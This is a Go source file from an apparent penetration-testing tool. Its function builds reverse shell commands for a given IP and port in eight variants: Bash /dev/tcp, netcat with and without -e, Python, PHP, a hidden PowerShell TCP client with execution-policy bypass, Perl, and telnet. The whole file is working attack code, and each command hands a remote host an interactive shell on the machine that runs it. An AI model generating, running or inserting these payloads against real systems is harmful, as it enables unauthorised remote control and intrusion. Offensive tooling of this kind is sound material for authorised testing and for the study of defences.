package payload

import "fmt"

// ShellCmd represents a reverse shell command
type ShellCmd struct {
	Name    string `json:"name"`
	Command string `json:"command"`
}

// GenerateShell generates all supported reverse shell commands for the given IP and port
func GenerateShell(ip, port string) []ShellCmd {
	return []ShellCmd{
		{
			Name: "Bash",
			Command: fmt.Sprintf("bash -c 'exec bash -i &>/dev/tcp/%s/%s <&1'", ip, port),
		},
		{
			Name: "NC (with -e)",
			Command: fmt.Sprintf("nc -e /bin/sh %s %s", ip, port),
		},
		{
			Name: "NC (no -e)",
			Command: fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, port),
		},
		{
			Name: "Python",
			Command: fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, ip, port),
		},
		{
			Name: "PHP",
			Command: fmt.Sprintf(`php -r '$s=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, ip, port),
		},
		{
			Name: "PowerShell",
			Command: fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`, ip, port),
		},
		{
			Name: "Perl",
			Command: fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, ip, port),
		},
		{
			Name: "Telnet",
			Command: fmt.Sprintf("rm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p", ip, port),
		},
	}
}
